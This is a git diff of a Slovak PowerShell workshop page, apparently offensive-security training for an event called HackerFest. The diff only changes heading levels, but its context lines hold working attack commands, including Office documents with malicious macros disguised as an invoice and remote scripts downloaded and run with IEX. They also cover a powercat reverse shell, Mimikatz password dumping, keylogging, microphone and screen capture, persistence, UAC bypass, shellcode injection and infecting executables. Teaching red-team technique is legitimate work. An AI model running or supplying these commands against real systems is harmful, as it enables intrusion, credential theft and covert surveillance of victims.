@@ -7,7 +7,7 @@ permalink: /sk/powershell/
 ---
 &nbsp;
 
-### Office dokument s&nbsp;automaticky spúšťaným makrom
+## Office dokument s&nbsp;automaticky spúšťaným makrom
 
 Vytvorte Office dokument (Word / Excel / PowerPoint) a&nbsp;vložte do&nbsp;neho cez&nbsp;makrá tento kód:
 
@@ -31,7 +31,7 @@ End Sub
 ```
 ```
 
-### Automatické generovanie dokumentov s&nbsp;makrami
+## Automatické generovanie dokumentov s&nbsp;makrami
 ```powershell
 # Import prikazu Out-Word z&nbsp;modulu nishang
 IEX(IWR 'https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-Word.ps1')
@@ -44,7 +44,7 @@ $path = Join-Path (Resolve-Path .) 'Faktura.doc'
 Out-Word -Payload $payload -OutputFile $path -RemainSafe
 ```
 
-### Offline prístup k&nbsp;AD databázi
+## Offline prístup k&nbsp;AD databázi
 
 [Zdrojové kódy modulu DSInternals](https://github.com/MichaelGrafnetter/DSInternals)
 ```powershell
@@ -110,7 +110,7 @@ Add-ADDBSidHistory -SamAccountName Adam -SidHistory $sid1,$sid2,$sid3 -SkipMetaU
 
 Úloha: Napíšte skripty na&nbsp;detekciu účtov so&nbsp;SID History a&nbsp;s&nbsp;neštandardnou primárnou skupinou.
 
-### Kódovanie a&nbsp;šifrovanie príkazov
+## Kódovanie a&nbsp;šifrovanie príkazov
 
 [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
 
@@ -131,7 +131,7 @@ cat .\evil.ps1
 de SuperSecret Random
 ```
 
-### Spustenie skriptu z&nbsp;webu
+## Spustenie skriptu z&nbsp;webu
 ```powershell
 # RickRoll
 iex (iwr https://bit.ly/e0Mw9w )
@@ -142,14 +142,14 @@ $uri = 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Rec
 Invoke-Portscan -Hosts www.hackerfest.cz
 ```
 
-### Obídenie PowerShell Execution Policy
+## Obídenie PowerShell Execution Policy
 
 ```powershell
 Set-ExecutionPolicy Restricted
 powershell.exe -ExecutionPolicy Bypass ...
 ```
 
-### Logovanie
+## Logovanie
 
 Úloha: Zapnite logovanie PowerShell príkazov cez&nbsp;lokálny GPO, spustite niekoľko príkazov a&nbsp;skúste ich nájsť v&nbsp;logoch.
 
@@ -158,7 +158,7 @@ powershell.exe -ExecutionPolicy Bypass ...
 [PowerShell 5 Logging](https://www.rootusers.com/enable-and-configure-module-script-block-and-transcription-logging-in-windows-powershell/)[  
 <img class="aligncenter" src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dunwoody%20powershell/figure_2.png" alt="" width="501" height="319" />](https://www.fireeye.com/content/dam/fireeye-www/blog/images/dunwoody%20powershell/figure_2.png) 
 
-### Perzistencia
+## Perzistencia
 
 [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
 ```powershell
@@ -173,7 +173,7 @@ Add-Persistence -ScriptBlock $RickRoll -ElevatedPersistenceOption $ElevatedOptio
 
 Úloha: Skúste WMI alebo Registry perzistenciu!
 
-### WMI Perzistencia (Manuálny spôsob)
+## WMI Perzistencia (Manuálny spôsob)
 
 [WMI Explorer](https://wmie.codeplex.com/downloads/get/924042)
 ```powershell
@@ -220,7 +220,7 @@ Remove-WmiObject -InputObject $filter
 Remove-WmiObject -InputObject $timer
 ```
 
-### P/Invoke &#8211; INI Parser 1
+## P/Invoke &#8211; INI Parser 1
 
 [GetPrivateProfileString MSDN](https://msdn.microsoft.com/en-us/library/windows/desktop/ms724353(v=vs.85).aspx?f=255&MSPPError=-2147217396)
 
@@ -267,7 +267,7 @@ Get-PrivateProfileString -File 'C:\Windows\System32\GroupPolicy\gpt.ini' `
                          -Key Version
 ```
 
-### P/Invoke &#8211; INI Parser 2
+## P/Invoke &#8211; INI Parser 2
 
 [Invoke-WindowsApi.ps1 ](https://raw.githubusercontent.com/hsmalley/Powershell/master/Invoke-WindowsApi.ps1)
 
@@ -307,30 +307,30 @@ Get-PrivateProfileString2 -File 'C:\Windows\System32\GroupPolicy\gpt.ini' `
 
 ```
 
-### Keylogger
+## Keylogger
 ```powershell
 Get-Keystrokes -LogPath C:\HackerFest\keystrokes.txt -Timeout 1 -PassThru
 ```
 
-### Nahrávanie z&nbsp;mikrofónu
+## Nahrávanie z&nbsp;mikrofónu
 ```powershell
 Get-MicrophoneAudio -Length 10 -Path C:\HackerFest\audio.wav
 ```
 
-### Screenshoty
+## Screenshoty
 ```powershell
 Enable-WindowsOptionalFeature -FeatureName NetFx3 -Online
 Get-TimedScreenshot -Path c:\hackerfest\ -Interval 10 -EndTime 14:00
 
 ```
 
-### Vykrádanie súborov
+## Vykrádanie súborov
 ```powershell
 Invoke-NinjaCopy -path c:\windows\system32\config\system -localdestination c:\HackerFest\system -verbose
 
 ```
 
-### Vykrádanie hesiel z&nbsp;pamäte
+## Vykrádanie hesiel z&nbsp;pamäte
 ```powershell
 Invoke-Mimikatz -DumpCreds # -ComputerName PC2
 Invoke-Mimikatz -Command 'sekurlsa::krbtgt' -ComputerName PC2
@@ -338,7 +338,7 @@ Invoke-Mimikatz -Command 'sekurlsa::krbtgt' -ComputerName PC2
 
 Tip: UAC / [LocalAccountTokenFilterPolicy](https://support.microsoft.com/en-us/help/951016/description-of-user-account-control-and-remote-restrictions-in-windows)
 
-### Vykrádanie hesiel z&nbsp;pamäte 2
+## Vykrádanie hesiel z&nbsp;pamäte 2
 
 [Mimikatz](https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20170813/mimikatz_trunk.zip)
 ```powershell
@@ -350,26 +350,26 @@ sekurlsa::minidump "C:\HackerFest\lsass_560.dmp"
 sekurlsa::logonPasswords
 ```
 
-### Vykrádanie hesiel z&nbsp;pamäte 3
+## Vykrádanie hesiel z&nbsp;pamäte 3
 
 [PowerMemory](https://github.com/giMini/PowerMemory)
 
 `Reveal-MemoryCredentials.ps1`
 
-### Heslá k&nbsp;WiFi
+## Heslá k&nbsp;WiFi
 
 [Get-WLANKeys](https://github.com/samratashok/nishang/blob/master/Gather/Get-WLAN-Keys.ps1)
 
-### BSOD po ukončení PowerShellu
+## BSOD po ukončení PowerShellu
 ```powershell
 Set-CriticalProcess
 ```
 
-### Spúšťanie príkazov na&nbsp;diaľku
+## Spúšťanie príkazov na&nbsp;diaľku
 
 Úloha: Spustite príkaz Stop-Process na&nbsp;vzdialenom PC.
 
-### Spúšťanie príkazov na&nbsp;diaľku bez PS Remotingu
+## Spúšťanie príkazov na&nbsp;diaľku bez PS Remotingu
 ```powershell
 # Načítanie PowerCat
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
@@ -393,21 +393,21 @@ powercat -c 10.0.0.1 -p 10000 -ep -ge
 
 Úloha 2: Vytvorte XLS dokument s&nbsp;makrom, ktoré spustí vygenerovaný payload.
 
-### Spúšťanie príkazov na&nbsp;diaľku cez&nbsp;WMI
+## Spúšťanie príkazov na&nbsp;diaľku cez&nbsp;WMI
 
 Znovu použijeme PowerSploit
 ```powershell
 Invoke-WmiCommand -Payload { if&nbsp;($True) { 'Do Evil' } } -ComputerName '10.10.1.1'
 ```
 
-### Spustenie natívneho kódu v&nbsp;inom procese
+## Spustenie natívneho kódu v&nbsp;inom procese
 ```powershell
 notepad
 $target = Get-Process notepad
 Invoke-ShellCode -Force -ProcessID $target.Id
 ```
 
-### Zavírovanie EXE súborov
+## Zavírovanie EXE súborov
 
 [Subver-PE](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Subvert-PE.ps1)
 ```powershell
@@ -415,7 +415,7 @@ Invoke-ShellCode -Force -ProcessID $target.Id
 Subvert-PE -Path 'C:\Program Files\Notepad++\notepad++.exe' -Write
 ```
 
-### Eskalácia oprávnení
+## Eskalácia oprávnení
 ```powershell
 # returns services with unquoted paths that&nbsp;also have a&nbsp;space in&nbsp;the&nbsp;name
 Get-ServiceUnquoted
@@ -438,7 +438,7 @@ Find-ProcessDLLHijack
 
 [What is&nbsp;DLL hijacking?](https://stackoverflow.com/questions/3623490/what-is-dll-hijacking)
 
-### MITM útok
+## MITM útok
 ```powershell
 iex(iwr 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Invoke-Inveigh.ps1')
 
@@ -447,28 +447,28 @@ Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -HTTP Y -HTTPS Y -SMB Y -NBNS Y -Machin
 Stop-Inveigh
 ```
 
-### Stream obrazovky
+## Stream obrazovky
 ```powershell
 Show-TargetScreen -Bind -Port 10800
 
 # firefox 'http://localhost:10800'
 ```
 
-### Obídenie UAC (pre-Windows 10)
+## Obídenie UAC (pre-Windows 10)
 ```powershell
 iex(iwr 'https://raw.githubusercontent.com/samratashok/nishang/master/Escalation/Invoke-PsUACme.ps1')
 Invoke-PsUACme -method mmc
 ```
 
-### Obídenie UAC
+## Obídenie UAC
 
 [UACME](https://github.com/hfiref0x/UACME)
 
-### Phishing
+## Phishing
 
 [Invoke-CredentialsPhish](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-CredentialsPhish.ps1)
 
-### Obídenie blokovaného powershell.exe
+## Obídenie blokovaného powershell.exe
 
 [Not PowerShell](https://github.com/Ben0xA/nps)
 ```powershell
